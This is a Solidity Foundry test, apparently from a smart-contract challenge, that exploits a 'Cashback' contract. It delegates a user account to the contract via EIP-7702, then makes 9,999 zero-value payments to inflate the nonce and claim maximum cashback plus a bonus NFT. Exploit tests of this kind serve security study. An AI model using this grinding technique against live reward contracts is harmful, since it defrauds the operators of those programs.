// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {Test, Vm} from "forge-std/Test.sol";
import {Cashback, Currency, CurrencyLibrary, equals} from "../Cashback.sol";
import {CashbackNFT} from "../mocks/CashbackNFT.sol";
import {CashbackToken} from "../mocks/CashbackToken.sol";

contract CashbackExploitTest is Test {
    using CurrencyLibrary for Currency;

    Cashback cashback;
    CashbackToken token1;
    CashbackToken token2;
    CashbackNFT superCashbackNFT;

    uint256 userPk = 0xA11CE;
    address user;

    uint256 constant RATE_TOKEN1 = 1000; // 10%
    uint256 constant RATE_TOKEN2 = 500;  // 5%
    uint256 constant MAX_CASHBACK_TOKEN1 = 100 ether;
    uint256 constant MAX_CASHBACK_TOKEN2 = 50 ether;

    Currency currency1;
    Currency currency2;
    uint256 tokenId1;
    uint256 tokenId2;

    function setUp() public {
        user = vm.addr(userPk);

        token1 = new CashbackToken("token1", "TK1");
        token2 = new CashbackToken("token2", "TK2");
        superCashbackNFT = new CashbackNFT("SuperCashback", "SCB");

        address[] memory currencies = new address[](2);
        currencies[0] = address(token1);
        currencies[1] = address(token2);

        uint256[] memory rates = new uint256[](2);
        rates[0] = RATE_TOKEN1;
        rates[1] = RATE_TOKEN2;

        uint256[] memory maxCashbacks = new uint256[](2);
        maxCashbacks[0] = MAX_CASHBACK_TOKEN1;
        maxCashbacks[1] = MAX_CASHBACK_TOKEN2;

        cashback = new Cashback(currencies, rates, maxCashbacks, address(superCashbackNFT));
        currency1 = Currency.wrap(address(token1));
        currency2 = Currency.wrap(address(token2));
        tokenId1 = currency1.toId();
        tokenId2 = currency2.toId();
        token1.mint(user, 1_000 ether);
    }

    function _delegate(uint256 pk, address who) internal {
        Vm.SignedDelegation memory signedDelegation = vm.signDelegation(address(cashback), pk);
        vm.attachDelegation(signedDelegation);
        assertEq(who.code.length, 23);
    }

    function _maxOutAndGrind(address account) internal {
        address receiver = makeAddr(string(abi.encodePacked("receiver-", account)));
        vm.startPrank(account, account); // msg.sender == tx.origin, satisfies onlyEOA
        Cashback(payable(account)).payWithCashback(currency1, receiver, 1_000 ether);
        for (uint256 i = 0; i < 9_999; i++) {
            Cashback(payable(account)).payWithCashback(currency1, receiver, 0);
        }
        vm.stopPrank();
    }

    function test_NormalWorkFlow() public {
        _delegate(userPk, user);
        _maxOutAndGrind(user);
        assertEq(Cashback(payable(user)).nonce(), 10_000);
        assertEq(cashback.balanceOf(user, tokenId1), MAX_CASHBACK_TOKEN1);
        assertEq(superCashbackNFT.balanceOf(user), 1);
    }
}